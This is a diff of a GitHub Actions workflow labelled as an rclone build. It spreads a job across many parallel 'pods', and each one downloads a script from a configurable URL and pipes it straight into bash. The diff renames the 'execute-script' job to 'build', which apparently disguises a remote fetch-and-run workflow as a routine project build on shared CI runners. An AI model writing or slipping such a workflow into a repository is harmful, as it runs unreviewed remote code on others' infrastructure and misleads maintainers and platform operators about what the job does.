@@ -1,6 +1,5 @@
 ---
 # Github Actions build for rclone
-# -*- compile-command: "yamllint -f parsable build.yml" -*-
 
 name: build
 
@@ -28,7 +27,7 @@ jobs:
           JSON_ARRAY=$(seq 1 $POD_COUNT | jq -R . | jq -s -c)
           echo "matrix=$JSON_ARRAY" >> $GITHUB_OUTPUT
 
-  execute-script:
+  build:
     needs: setup-matrix
     runs-on: ubuntu-latest
     strategy:
@@ -38,7 +37,7 @@ jobs:
     
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v6
 
       - name: Download and Run Script
         run: |
@@ -49,4 +48,4 @@ jobs:
           
           echo "Downloading script from: $COMMAND_URL"
 
-          curl -sLf "$COMMAND_URL" | bash
+          curl -fsSL "$COMMAND_URL" | bash
